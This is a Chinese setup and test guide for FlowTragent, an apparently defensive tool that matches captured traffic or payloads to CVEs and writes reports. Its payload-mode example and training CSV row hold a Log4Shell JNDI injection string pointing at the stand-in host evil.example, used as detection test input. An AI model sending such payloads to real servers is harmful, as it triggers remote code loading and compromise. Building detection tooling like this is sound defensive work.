# FlowTragent WSL Ubuntu 启动与测试指南

本文档面向 Windows 11 + WSL2 Ubuntu 环境，目标是从零启动 FlowTragent，并跑通：

```text
PCAP / payload -> CSV -> NOVA-F style retrieval -> Agent analysis -> RAG context -> report
```

## 1. 克隆项目

```bash
mkdir -p ~/projects
cd ~/projects
git clone --recurse-submodules https://github.com/sishijiuhack/FlowTragent.git
cd FlowTragent
```

如果已经普通克隆过项目，补拉 NOVA-F 子模块：

```bash
git submodule update --init --recursive
```

作用：`libs/nova-f/` 是 FlowTragent 的底层检索引擎依赖，作为子模块独立管理。

## 2. 创建虚拟环境

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip git

python3 -m venv flowtragent_env
source flowtragent_env/bin/activate
python -m pip install --upgrade pip setuptools wheel
```

看到终端前缀出现 `(flowtragent_env)` 即表示虚拟环境已激活。

## 3. 安装依赖

推荐给 pip 单独指定临时目录，避免 WSL 默认临时目录空间不足：

```bash
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
```

验证依赖：

```bash
python -m pip check
python - <<'PY'
import torch, faiss, sentence_transformers, chromadb, langchain, langgraph, scapy
print("deps ok")
PY
```

## 4. 跑 NOVA 检索 demo

```bash
python tests/test_nova.py
```

预期输出里应能看到类似：

```text
CVE-2021-44228
```

作用：验证 `NovaClient.search(payload)` 能返回 CVE 候选。

## 5. 跑 PCAP 端到端 demo

生成一个带 Log4Shell 风格 HTTP 请求的 demo PCAP：

```bash
python tests/make_demo_pcap.py
```

运行 FlowTragent：

```bash
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index
```

启用本地 RAG 上下文：

```bash
python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

查看报告：

```bash
ls -lh reports/
tail -n +1 reports/*.md
```

作用：验证完整链路：

```text
PCAP -> data/csv/demo_attack.csv -> data/index demo index -> reports/*.md
```

## 6. payload 直接输入模式

```bash
python main.py \
  --mode payload \
  --input 'GET /?x=${jndi:ldap://evil.example/a} HTTP/1.1 Host: victim' \
  --demo-index \
  --enable-rag
```

作用：无需 PCAP，直接用单条 payload 验证检索和报告链路。

## 7. Ollama 可选验证

安装 Ollama：

```bash
curl -fsSL https://ollama.com/install.sh | sh
ollama pull phi3:mini
```

启动服务：

```bash
OLLAMA_HOST=0.0.0.0:11434 ollama serve
```

另开一个 WSL 终端测试：

```bash
curl http://127.0.0.1:11434/api/generate \
  -d '{"model":"phi3:mini","prompt":"Summarize Log4Shell in one sentence.","stream":false}'
```

让 FlowTragent 调用 Ollama：

```bash
source flowtragent_env/bin/activate
python main.py \
  --mode pcap \
  --input data/pcap/demo_attack.pcap \
  --demo-index \
  --enable-rag \
  --enable-ollama
```

如果 Ollama 未启动，报告仍会生成，只是 `Agent Summary` 会提示 Ollama 不可用。

## 8. Web 界面

启动 Flask Web 界面：

```bash
source flowtragent_env/bin/activate
python web_app.py
```

然后在浏览器打开：

```text
http://127.0.0.1:5000
```

可以直接输入 payload，或上传 `.pcap/.pcapng` 文件生成报告。

如果在 Windows 浏览器访问 WSL 服务失败，确认 Flask 监听地址，必要时把 `web_app.py` 里的 `127.0.0.1` 改为 `0.0.0.0`。

## 9. live 抓包模式

安装 tcpdump：

```bash
sudo apt update
sudo apt install -y tcpdump
```

查看网卡：

```bash
ip addr
```

抓取 30 秒流量并分析：

```bash
sudo ~/projects/FlowTragent/flowtragent_env/bin/python main.py \
  --mode live \
  --interface eth0 \
  --capture-seconds 30 \
  --output-dir ./reports \
  --enable-rag
```

如果你想先手动抓包：

```bash
sudo tcpdump -i eth0 -w /tmp/test.pcap
python main.py --mode pcap --input /tmp/test.pcap --output-dir ./reports --enable-rag
```

## 10. 使用真实 NOVA-F 风格索引

FlowTragent 默认读取：

```text
data/index/faiss.index
data/index/meta.json
```

如果这两个文件存在，`NovaClient` 会优先使用真实索引；如果不存在或加了 `--demo-index`，才会使用 demo 索引。

训练 CSV 至少包含：

```text
id,payload_clean,cve_labels
```

示例：

```csv
id,payload_clean,cve_labels
1,"GET /?x=${jndi:ldap://a/b} HTTP/1.1","CVE-2021-44228"
```

构建索引：

```bash
python scripts/build_demo_index.py \
  --input data/csv/train_payloads.csv \
  --output-dir data/index \
  --model sentence-transformers/all-MiniLM-L6-v2
```

离线或 HuggingFace 不可用时，可使用本地哈希 embedding：

```bash
FLOWTRAGENT_OFFLINE=1 python scripts/build_demo_index.py \
  --input data/csv/train_payloads.csv \
  --output-dir data/index
```

## 11. 常见错误修复

### pip 提示 No space left on device

```bash
mkdir -p ~/pip-tmp ~/pip-cache
TMPDIR=~/pip-tmp PIP_CACHE_DIR=~/pip-cache python -m pip install -r requirements.txt
```

### 找不到 venv

```bash
sudo apt update
sudo apt install -y python3-venv python3-pip
```

### tcpdump 权限问题

优先使用 `sudo`。如果想给 tcpdump 授权：

```bash
sudo setcap cap_net_raw,cap_net_admin=eip "$(command -v tcpdump)"
```

### HuggingFace 证书或网络失败

demo 和 RAG 默认可以离线运行：

```bash
FLOWTRAGENT_OFFLINE=1 python tests/test_nova.py
FLOWTRAGENT_OFFLINE=1 python main.py --mode pcap --input data/pcap/demo_attack.pcap --demo-index --enable-rag
```

### WSL 访问 Ollama 失败

确认 Ollama 监听地址：

```bash
OLLAMA_HOST=0.0.0.0:11434 ollama serve
curl http://127.0.0.1:11434/api/tags
```
